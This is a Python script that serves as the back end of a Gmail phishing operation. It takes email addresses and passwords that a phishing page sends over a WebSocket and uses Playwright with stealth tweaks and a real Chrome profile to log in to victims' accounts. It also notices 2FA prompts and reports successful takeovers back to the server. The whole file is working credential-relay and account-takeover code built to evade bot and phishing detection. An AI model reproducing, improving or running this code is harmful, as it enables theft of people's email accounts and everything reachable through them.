import re
import time
import json
import threading
import random
import os
import platform
import websocket
from urllib.parse import quote
from playwright.sync_api import sync_playwright, TimeoutError as PlaywrightTimeoutError

# ====== CONFIGURATION ======
RENDER_WS_URL = 'wss://viewsharedcontent.onrender.com/messages'

processed_emails = set()
pending_passwords = {}  # Store passwords waiting to be filled
ws_connected = False
active_browsers = {}  # Store browser sessions by email
browser_lock = threading.Lock()  # Thread-safe browser access
last_email = None  # Track the last email that opened a browser

def get_chrome_profile_path():
    """Get the path to the real Chrome profile"""
    system = platform.system()
    home = os.path.expanduser('~')
    
    if system == 'Windows':
        return os.path.join(home, 'AppData', 'Local', 'Google', 'Chrome', 'User Data')
    elif system == 'Darwin':  # macOS
        return os.path.join(home, 'Library', 'Application Support', 'Google', 'Chrome')
    else:  # Linux
        return os.path.join(home, '.config', 'google-chrome')

# ====== WEBSOCKET FUNCTIONS ======
def on_ws_message(ws, message):
    global ws_connected, last_email
    try:
        data = json.loads(message)
        print(f"📩 Message: {data}")
        
        if data.get('type') == 'ack':
            print(f"✅ Confirmed: {data.get('email')}")
            return
        
        if data.get('type') == 'email_capture':
            email = data.get('email')
            if email and email not in processed_emails:
                processed_emails.add(email)
                last_email = email  # Store the last email
                print(f"\n{'='*50}")
                print(f"📧 NEW EMAIL: {email}")
                print(f"{'='*50}")
                threading.Thread(target=open_google_login_playwright, args=(email,), daemon=True).start()
        
        if data.get('type') == 'password_capture':
            email = data.get('email')
            password = data.get('password')
            
            # Check if email is valid (not a Google element ID)
            if email and '@' in email and not email.startswith('jsname='):
                print(f"\n{'='*50}")
                print(f"🔑 PASSWORD RECEIVED for: {email}")
                print(f"🔑 Password: {password}")
                print(f"{'='*50}")
                
                # Store password for this email
                with browser_lock:
                    pending_passwords[email] = password
                
                # Fill password immediately if browser exists
                fill_password_async(email, password)
            else:
                # Invalid email from phishing page - try to use the last known email
                print(f"\n⚠️ Received invalid email: {email} (likely from phishing page)")
                if last_email:
                    print(f"🔄 Using last known email: {last_email}")
                    print(f"🔑 Password: {password}")
                    print(f"{'='*50}")
                    
                    with browser_lock:
                        pending_passwords[last_email] = password
                    
                    fill_password_async(last_email, password)
                else:
                    print(f"❌ No valid email found to associate with this password")
                
    except Exception as e:
        print(f"⚠️ WebSocket message error: {e}")

def on_ws_error(ws, error):
    print(f"⚠️ WebSocket error: {error}")

def on_ws_close(ws, close_status_code, close_msg):
    global ws_connected
    print(f"🔌 Disconnected")
    ws_connected = False
    time.sleep(3)
    connect_websocket()

def on_ws_open(ws):
    global ws_connected
    print("🔌 WebSocket connected!")
    ws_connected = True
    ws.send(json.dumps({'type': 'ping', 'message': 'Python client connected'}))

def connect_websocket():
    global ws
    while True:
        try:
            print(f"🔌 Connecting to: {RENDER_WS_URL}")
            ws = websocket.WebSocketApp(
                RENDER_WS_URL,
                on_open=on_ws_open,
                on_message=on_ws_message,
                on_error=on_ws_error,
                on_close=on_ws_close
            )
            ws.run_forever()
        except Exception as e:
            print(f"⚠️ Connection failed: {e}")
            time.sleep(5)

# ====== PASSWORD FILLING FUNCTIONS ======
def fill_password_async(email, password):
    """Try to fill password in existing browser window"""
    def fill_thread():
        try:
            with browser_lock:
                if email in active_browsers:
                    print(f"✅ Browser found for {email}, filling password...")
                    fill_password_in_browser(email, password)
                else:
                    print(f"⏳ Browser for {email} not ready, waiting...")
                    # Wait up to 30 seconds for browser to be ready
                    for i in range(30):
                        if email in active_browsers:
                            print(f"✅ Browser became available after {i+1}s, filling password...")
                            fill_password_in_browser(email, password)
                            return
                        time.sleep(1)
                    print(f"❌ Browser for {email} never appeared")
        except Exception as e:
            print(f"❌ Error filling password: {e}")
            import traceback
            traceback.print_exc()
    
    threading.Thread(target=fill_thread, daemon=True).start()

def wait_for_password_field(page, timeout=20):
    """Wait for the password field to appear on the page"""
    print("⏳ Waiting for password field to appear...")
    
    # These are the exact selectors from your HTML
    password_selectors = [
        'input[type="password"]',  # Generic
        'input[name="Passwd"]',    # Google's name
        'input[jsname="YPqjbf"]',  # The exact jsname from your HTML
        'input[class*="whsOnd"]',  # The exact class from your HTML
        'input[autocomplete="current-password"]',
        'input[aria-label="Enter your password"]',  # Exact aria-label
        'input[aria-label*="password" i]',
        'input#password',
    ]
    
    start_time = time.time()
    while time.time() - start_time < timeout:
        # First, check if we're already in Gmail
        try:
            current_url = page.url
            if 'mail.google' in current_url and '/mail/' in current_url:
                print("✅ Already logged in!")
                return None
        except:
            pass
            
        for selector in password_selectors:
            try:
                password_field = page.query_selector(selector)
                if password_field and password_field.is_visible():
                    elapsed = time.time() - start_time
                    print(f"✅ Password field found after {elapsed:.1f}s using: {selector}")
                    return password_field
            except:
                continue
        
        # Check if we're on a verification page
        try:
            current_url = page.url
            if 'challenge' in current_url.lower() or 'verify' in current_url.lower():
                print("🔐 Verification page detected.")
                return None
        except:
            pass
            
        time.sleep(0.5)
    
    print(f"❌ Password field not found after {timeout}s")
    return None

def fill_password_in_browser(email, password):
    """Fill password in the browser page - FIXED FOR GOOGLE'S COMPLEX STRUCTURE"""
    try:
        with browser_lock:
            if email not in active_browsers:
                print(f"❌ No active browser for {email}")
                return
            data = active_browsers[email]
            page = data['page']
        
        print(f"🔑 Attempting to fill password for: {email}")
        print(f"📍 Current URL: {page.url}")
        
        # Check if already logged in
        if 'mail.google' in page.url and '/mail/' in page.url:
            print(f"✅ Already logged in to Gmail for: {email}")
            send_login_success(email)
            return
        
        # Wait for password field with the correct selectors
        print("⏳ Looking for password field...")
        
        # Specifically target the password field from your HTML
        password_field = None
        password_selectors = [
            'input[type="password"]',  # Generic fallback
            'input[name="Passwd"]',    # The name attribute from your HTML
            'input[jsname="YPqjbf"]',  # The jsname from your HTML
            'input[class*="whsOnd"]',  # The class from your HTML
            'input[autocomplete="current-password webauthn"]',  # Exact autocomplete
            'input[aria-label="Enter your password"]',  # Exact aria-label
        ]
        
        for selector in password_selectors:
            try:
                # Wait for the element with a short timeout
                password_field = page.wait_for_selector(selector, timeout=2000)
                if password_field and password_field.is_visible():
                    print(f"✅ Found password field with: {selector}")
                    break
                else:
                    password_field = None
            except:
                continue
        
        if not password_field:
            print("❌ Password field not found! Trying JavaScript to find it...")
            # Last resort: find any visible password input
            password_field = page.query_selector('input[type="password"]')
            if not password_field or not password_field.is_visible():
                print("❌ Still no password field found")
                return False
        
        print("✅ Password field found!")
        
        # === FIXED: PROPER EVENT TRIGGERING ===
        print("⌨️ Filling password...")
        
        # Method 1: JavaScript injection with proper events
        try:
            # Get the field's ID or create a unique identifier
            field_info = page.evaluate("""
                (element) => {
                    const id = element.id || 'password_' + Math.random().toString(36).substring(2);
                    if (!element.id) element.id = id;
                    return { id: element.id, tag: element.tagName, type: element.type };
                }
            """, password_field)
            
            # Inject the password with proper React/Google event handling
            js_code = f"""
                (function() {{
                    const field = document.getElementById('{field_info['id']}');
                    if (!field) return false;
                    
                    // Focus the field
                    field.focus();
                    field.click();
                    
                    // Set the value
                    field.value = '{password}';
                    
                    // Trigger ALL possible events that Google listens to
                    const events = ['input', 'change', 'blur', 'focus', 'keydown', 'keyup', 'keypress'];
                    events.forEach(eventType => {{
                        const event = new Event(eventType, {{ bubbles: true, cancelable: true }});
                        // Add specific properties for React/Google
                        if (eventType === 'input') {{
                            Object.defineProperty(event, 'target', {{ value: field, enumerable: true }});
                        }}
                        field.dispatchEvent(event);
                    }});
                    
                    // Also trigger a custom event that Google might use
                    const customEvent = new CustomEvent('change', {{ 
                        bubbles: true, 
                        cancelable: true,
                        detail: {{ value: '{password}' }}
                    }});
                    field.dispatchEvent(customEvent);
                    
                    // Update the field's data attribute if Google uses it
                    field.setAttribute('data-value', '{password}');
                    
                    return true;
                }})();
            """
            
            success = page.evaluate(js_code)
            
            if success:
                print("✅ Password injected via JavaScript with proper events")
            else:
                print("⚠️ JavaScript injection returned False, trying other methods")
                raise Exception("JS injection failed")
                
        except Exception as e:
            print(f"⚠️ JavaScript method failed: {e}")
            
            # Method 2: Manual typing with proper focus
            print("⌨️ Trying manual typing method...")
            try:
                # Click and focus the field
                password_field.click()
                time.sleep(0.3)
                password_field.focus()
                time.sleep(0.2)
                
                # Clear the field
                password_field.press('Control+A')
                time.sleep(0.1)
                password_field.press('Backspace')
                time.sleep(0.2)
                
                # Type the password with realistic timing
                for char in password:
                    password_field.type(char, delay=random.randint(30, 80))
                
                time.sleep(0.5)
                print("✅ Password typed manually")
                
            except Exception as e2:
                print(f"❌ Manual typing failed: {e2}")
                return False
        
        # === FIXED: PROPER SUBMISSION ===
        print("⏳ Submitting password...")
        
        # Wait a moment for the field value to be processed
        time.sleep(0.5)
        
        # Try multiple ways to submit
        submitted = False
        
        # Method 1: Find and click Next button
        try:
            # Wait for the Next button with multiple selectors
            next_selectors = [
                'button[jsname="LgbsSe"]',  # Google's specific button
                'button[type="submit"]',
                'button:has-text("Next")',
                'button[aria-label*="Next" i]',
                '#passwordNext button',
                'button[class*="CwaK9"]'
            ]
            
            next_button = None
            for selector in next_selectors:
                try:
                    # Try to find the button
                    next_button = page.wait_for_selector(selector, timeout=1500)
                    if next_button and next_button.is_visible() and next_button.is_enabled():
                        print(f"✅ Found Next button: {selector}")
                        break
                    else:
                        next_button = None
                except:
                    continue
            
            if next_button:
                print("🔘 Clicking Next button...")
                time.sleep(0.3)
                next_button.click()
                submitted = True
                print("✅ Clicked Next button")
            else:
                print("⚠️ No Next button found")
        except Exception as e:
            print(f"⚠️ Clicking Next button failed: {e}")
        
        # Method 2: Press Enter key
        if not submitted:
            print("⏎ Pressing Enter key...")
            try:
                # Make sure the password field is focused
                password_field.focus()
                time.sleep(0.2)
                page.keyboard.press('Enter')
                submitted = True
                print("✅ Pressed Enter")
            except Exception as e:
                print(f"⚠️ Pressing Enter failed: {e}")
        
        # Method 3: Submit via JavaScript
        if not submitted:
            print("💉 Trying JavaScript form submit...")
            try:
                page.evaluate("""
                    const form = document.querySelector('form');
                    if (form) {
                        form.submit();
                        return true;
                    }
                    return false;
                """)
                submitted = True
                print("✅ Submitted via JavaScript")
            except Exception as e:
                print(f"⚠️ JavaScript submit failed: {e}")
        
        # Wait for the login to process
        time.sleep(3)
        
        # Check the result
        check_login_result(email, page)
        
        return True
        
    except Exception as e:
        print(f"❌ Error filling password: {e}")
        import traceback
        traceback.print_exc()
        return False
def check_login_result(email, page):
    """Check if login was successful or failed"""
    try:
        # Wait a moment for the page to update
        time.sleep(2)
        
        current_url = page.url
        print(f"📍 After login URL: {current_url}")
        
        # Check for successful login (redirect to Gmail or other Google service)
        if 'mail.google' in current_url and '/mail/' in current_url:
            print(f"🎉 SUCCESS! Logged into Gmail for: {email}")
            print(f"🔗 Gmail URL: {current_url}")
            
            # Send success notification
            send_login_success(email)
            
            # Keep browser open but monitor for logout
            print("📧 Gmail opened successfully! Browser will stay open.")
            return True
            
        elif 'accounts.google.com' in current_url:
            # Check for error messages
            error_selectors = [
                '[role="alert"]',
                '.o6cuMc',
                '.Ekjuhf',
                '[data-error]',
                '.error-msg'
            ]
            
            for selector in error_selectors:
                try:
                    error_elem = page.query_selector(selector)
                    if error_elem:
                        error_text = error_elem.text_content()
                        print(f"⚠️ Login message: {error_text}")
                        
                        # Check if it's a password error
                        if 'wrong' in error_text.lower() or 'incorrect' in error_text.lower():
                            print("❌ Wrong password detected")
                            return False
                        elif 'recovery' in current_url.lower():
                            print("⚠️ Account recovery needed")
                            return False
                except:
                    continue
            
            print("ℹ️ Still on accounts.google.com - may need additional verification")
            return False
            
        else:
            # We might be on a different page
            print(f"ℹ️ Redirected to: {current_url}")
            return False
            
    except Exception as e:
        print(f"⚠️ Error checking login result: {e}")
        return False

def send_login_success(email):
    """Send success notification via WebSocket"""
    try:
        if ws_connected and ws:
            ws.send(json.dumps({
                'type': 'login_success',
                'email': email,
                'timestamp': time.time()
            }))
            print(f"📤 Sent login success notification for {email}")
    except Exception as e:
        print(f"⚠️ Could not send success notification: {e}")

def handle_2fa_or_verification(email, page):
    """Handle potential 2FA or verification prompts"""
    try:
        # Check for 2FA/verification prompts
        verification_selectors = [
            'input[type="tel"]',
            'input[type="number"]',
            'input[autocomplete="one-time-code"]',
            '[aria-label*="verification code" i]',
            '[aria-label*="verification" i]',
            '.verification-code-input'
        ]
        
        for selector in verification_selectors:
            try:
                element = page.query_selector(selector)
                if element and element.is_visible():
                    print("🔐 2FA/Verification code required!")
                    print("⏳ Waiting for verification code...")
                    
                    # Send notification that 2FA is needed
                    if ws_connected and ws:
                        ws.send(json.dumps({
                            'type': 'verification_needed',
                            'email': email,
                            'timestamp': time.time()
                        }))
                    
                    # Wait for verification code (you'd need to implement the actual code input mechanism)
                    # For now, just keep the browser open
                    return True
            except:
                continue
        
        # Check for "Verify your identity" page
        if 'challenge' in page.url.lower() or 'verify' in page.url.lower():
            print("🔐 Identity verification required!")
            print("⏳ Waiting for user to complete verification...")
            return True
            
        return False
    except Exception as e:
        print(f"⚠️ Error checking for verification: {e}")
        return False

# ====== PLAYWRIGHT WITH REAL CHROME PROFILE ======
def open_google_login_playwright(email):
    """
    Opens Google login using a real Chrome profile to avoid detection
    """
    try:
        print(f"\n🚀 Opening Google for: {email}")
        
        # Close any existing browsers for this email
        with browser_lock:
            if email in active_browsers:
                try:
                    active_browsers[email]['browser'].close()
                    active_browsers[email]['playwright'].stop()
                except:
                    pass
                del active_browsers[email]
                time.sleep(2)
        
        p = sync_playwright().start()
        
        # Use a real Chrome profile
        chrome_profile_path = get_chrome_profile_path()
        profile_name = 'Default'  # Or 'Profile 1', 'Profile 2', etc.
        full_profile_path = os.path.join(chrome_profile_path, profile_name)
        
        print(f"📁 Using Chrome profile: {full_profile_path}")
        
        # Launch with persistent context using real Chrome profile
        context = p.chromium.launch_persistent_context(
            user_data_dir=full_profile_path,
            headless=False,
            args=[
                '--start-maximized',
                '--disable-blink-features=AutomationControlled',
                '--disable-infobars',
                '--no-sandbox',
                '--disable-dev-shm-usage',
                '--disable-gpu',
                '--disable-software-rasterizer',
                '--disable-features=IsolateOrigins,site-per-process',
                '--disable-site-isolation-trials',
                '--disable-web-security',
                '--disable-features=BlockInsecurePrivateNetworkRequests',
                '--disable-features=OutOfBlinkCors',
                '--disable-sync',
                '--disable-default-apps',
                '--disable-extensions',
                '--disable-component-extensions-with-background-pages',
                '--disable-client-side-phishing-detection',
                '--disable-crash-reporter',
                '--disable-breakpad',
                '--disable-background-networking',
                '--disable-hang-monitor',
                '--disable-popup-blocking',
                '--disable-prompt-on-repost',
                '--disable-renderer-backgrounding',
                '--disable-backgrounding-occluded-windows'
            ],
            viewport={'width': 1366, 'height': 768},
            user_agent='Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            locale='en-US',
            timezone_id='America/New_York',
            permissions=['geolocation'],
            device_scale_factor=1,
            has_touch=False,
            is_mobile=False,
            color_scheme='light',
            accept_downloads=True,
            java_script_enabled=True,
            bypass_csp=True,
            ignore_https_errors=True
        )
        
        page = context.new_page()
        
        # Enhanced stealth script
        page.add_init_script("""
            // Remove automation traces
            Object.defineProperty(navigator, 'webdriver', { get: () => undefined });
            Object.defineProperty(navigator, 'selenium', { get: () => undefined });
            Object.defineProperty(navigator, 'plugins', { get: () => {
                const plugins = [
                    { name: 'Chrome PDF Plugin' },
                    { name: 'Chrome PDF Viewer' },
                    { name: 'Native Client' }
                ];
                plugins.item = (index) => plugins[index];
                plugins.namedItem = (name) => plugins.find(p => p.name === name);
                plugins.refresh = () => {};
                return plugins;
            }});
            
            // Override navigator properties
            Object.defineProperty(navigator, 'languages', { get: () => ['en-US', 'en', 'es'] });
            Object.defineProperty(navigator, 'platform', { get: () => 'Win32' });
            Object.defineProperty(navigator, 'hardwareConcurrency', { get: () => 8 });
            Object.defineProperty(navigator, 'deviceMemory', { get: () => 8 });
            
            // Chrome specific
            window.chrome = {
                runtime: {},
                loadTimes: function() {},
                csi: function() {},
                app: {}
            };
            
            // Remove Playwright specific properties
            delete window.__playwright__binding__;
            delete window.__pw_manual__;
            delete window.__PW_inspect__;
            
            // Override permissions
            const originalQuery = window.navigator.permissions.query;
            window.navigator.permissions.query = (parameters) => (
                parameters.name === 'notifications' ?
                    Promise.resolve({ state: Notification.permission }) :
                    originalQuery(parameters)
            );
        """)
        
        print("🌐 Navigating to Google login...")
        
        # Go directly to login page
        encoded_email = quote(email)
        url = f"https://accounts.google.com/signin/v2/identifier?flowName=GlifWebSignIn&flowEntry=ServiceLogin&Email={encoded_email}&continue=https://mail.google.com"
        
        # Add random delay before navigation
        time.sleep(random.uniform(1, 3))
        
        # Navigate and wait for load
        page.goto(url, wait_until='networkidle', timeout=45000)
        
        # Check if we're on the right page
        current_url = page.url
        print(f"📍 Current URL: {current_url}")
        
        # Handle recovery page redirect
        if 'recovery' in current_url.lower():
            print("⚠️ Redirected to recovery page - trying alternative...")
            page.goto('https://accounts.google.com/ServiceLogin?service=mail', wait_until='networkidle')
            time.sleep(2)
            current_url = page.url
            print(f"📍 New URL: {current_url}")
        
        # Check if already logged in
        if 'mail.google' in current_url and '/mail/' in current_url:
            print(f"✅ Already logged in as {email}!")
            print(f"🔗 Gmail URL: {current_url}")
            
            # Store browser references
            with browser_lock:
                active_browsers[email] = {
                    'browser': context.browser,
                    'playwright': p,
                    'page': page,
                    'context': context
                }
            
            send_login_success(email)
            
            # Keep browser alive
            while True:
                time.sleep(1)
                try:
                    page.evaluate("1+1")
                except Exception as e:
                    print(f"🔴 Browser for {email} was closed: {e}")
                    break
            
            return
        
        # Try to find and fill email field
        email_filled = False
        try:
            email_selectors = [
                'input[type="email"]',
                'input[type="text"]',
                'input[name="identifier"]',
                '#identifierId',
                'input[autocomplete="username"]'
            ]
            
            email_field = None
            for selector in email_selectors:
                try:
                    email_field = page.wait_for_selector(selector, timeout=3000)
                    if email_field and email_field.is_visible():
                        print(f"✅ Found email field with selector: {selector}")
                        break
                except:
                    continue
            
            if email_field:
                # Check if email is already filled
                current_email = email_field.input_value()
                if current_email == email:
                    print("✅ Email already filled")
                else:
                    # Human-like typing for email
                    email_field.click()
                    time.sleep(0.5 + random.random())
                    email_field.fill('')
                    time.sleep(0.3)
                    for char in email:
                        email_field.type(char, delay=random.randint(30, 80))
                    time.sleep(1 + random.random() * 0.5)
                    print(f"✅ Entered email: {email}")
                
                # Click Next with human-like behavior
                next_button = page.wait_for_selector('#identifierNext button, button:has-text("Next")', timeout=5000)
                if next_button:
                    next_button.click()
                    print("✅ Clicked Next button")
                else:
                    page.keyboard.press('Enter')
                    print("✅ Pressed Enter")
                
                email_filled = True
                
                # IMPORTANT: Wait for the password page to load
                print("⏳ Waiting for password page to load...")
                time.sleep(3)  # Give it time to transition
                
                # Wait for the password field to appear
                try:
                    # Wait for the password input to become visible
                    password_field_ready = page.wait_for_selector('input[type="password"]', timeout=10000)
                    if password_field_ready:
                        print("✅ Password page loaded successfully!")
                    else:
                        print("⚠️ Password field not found after waiting")
                except Exception as e:
                    print(f"⚠️ Password field not found after waiting: {e}")
                    # Take a screenshot to debug
                    try:
                        page.screenshot(path=f'debug_after_next_{email}.png')
                        print("📸 Saved debug screenshot")
                    except:
                        pass
                
            else:
                print("⚠️ Email field not found, trying direct Gmail...")
                page.goto('https://accounts.google.com/ServiceLogin?service=mail', wait_until='networkidle')
                time.sleep(2)
                email_field = page.wait_for_selector('input[type="email"]', timeout=10000)
                if email_field:
                    email_field.fill(email)
                    page.keyboard.press('Enter')
                    print("✅ Entered email via Gmail direct")
                    email_filled = True
                    time.sleep(2)
                
        except PlaywrightTimeoutError:
            print("⚠️ Timeout - email field not found")
            page.goto(f'https://accounts.google.com/ServiceLogin?service=mail&Email={encoded_email}', wait_until='networkidle')
            time.sleep(3)
            try:
                email_field = page.wait_for_selector('input[type="email"]', timeout=5000)
                email_field.fill(email)
                page.keyboard.press('Enter')
                print("✅ Entered email via final approach")
                email_filled = True
                time.sleep(2)
            except Exception as e:
                print(f"❌ Could not enter email: {e}")
                try:
                    page.screenshot(path=f'error_email_{email}.png')
                    print("📸 Saved error screenshot")
                except:
                    pass
        
        # Store browser references
        with browser_lock:
            active_browsers[email] = {
                'browser': context.browser,
                'playwright': p,
                'page': page,
                'context': context
            }
        
        print(f"✅ Google login page ready for: {email}")
        
        # If email was filled, wait for password
        if email_filled:
            print("⏳ Waiting for password...")
            
            # Check if we already have a password for this email
            with browser_lock:
                if email in pending_passwords:
                    print(f"🔑 Found stored password for {email}, filling...")
                    # Wait a bit more for the page to be fully ready
                    time.sleep(1)
                    fill_password_in_browser(email, pending_passwords[email])
                else:
                    # Wait for password to arrive
                    print("📡 Waiting for password from WebSocket...")
                    # Password will be filled when received
        else:
            print("⚠️ Email may not have been entered correctly")
            print("📡 Waiting for manual intervention or password...")
        
        print("ℹ️  Browser will stay open - DO NOT close the terminal!")
        print(f"🔗 Current URL: {page.url}\n")
        
        # Monitor for verification/2FA
        verification_detected = handle_2fa_or_verification(email, page)
        if verification_detected:
            print("🔐 Verification in progress. Waiting for user...")
        
        # Keep the browser open with error handling
        while True:
            time.sleep(1)
            try:
                # Check if page is still alive
                page.evaluate("1+1")
                
                # Check for new password if not already filled
                with browser_lock:
                    if email in pending_passwords and email in active_browsers:
                        try:
                            # Check if we're still on a login page
                            if 'accounts.google.com' in page.url:
                                # Check if we're on the password page
                                if 'password' in page.url.lower() or 'signin' in page.url.lower():
                                    # Check if password field exists
                                    password_field = page.query_selector('input[type="password"]')
                                    if password_field and password_field.is_visible():
                                        fill_password_in_browser(email, pending_passwords[email])
                        except:
                            pass
                
            except Exception as e:
                print(f"🔴 Browser for {email} was closed: {e}")
                with browser_lock:
                    if email in active_browsers:
                        del active_browsers[email]
                break
                
    except Exception as error:
        print(f"❌ Playwright automation failed: {error}")
        import traceback
        traceback.print_exc()
        return None

# ====== CLEANUP ======
def cleanup_browsers():
    """Clean up all browser sessions"""
    with browser_lock:
        for email, data in list(active_browsers.items()):
            try:
                data['browser'].close()
                data['playwright'].stop()
                print(f"🧹 Closed browser for {email}")
            except Exception as e:
                print(f"⚠️ Could not close browser for {email}: {e}")
        active_browsers.clear()
        pending_passwords.clear()

# ====== MAIN ======
if __name__ == "__main__":
    print("\n" + "="*60)
    print("🚀 GMAIL AUTOMATOR (Unified Email + Password)")
    print("="*60)
    print(f"🔌 WebSocket: {RENDER_WS_URL}")
    print(f"📁 Chrome Profile: {get_chrome_profile_path()}")
    print("="*60)
    print("💡 Using real Chrome profile to avoid detection")
    print("🎯 Make sure Chrome is installed and you've logged in before")
    print("📧 Send email from phishing page to test")
    print("🔑 Password will be autofilled when received")
    print("📱 2FA/Verification detection included")
    print("="*60 + "\n")
    
    try:
        connect_websocket()
    except KeyboardInterrupt:
        print("\n🛑 Shutting down...")
        cleanup_browsers()
        print("✅ Cleanup complete")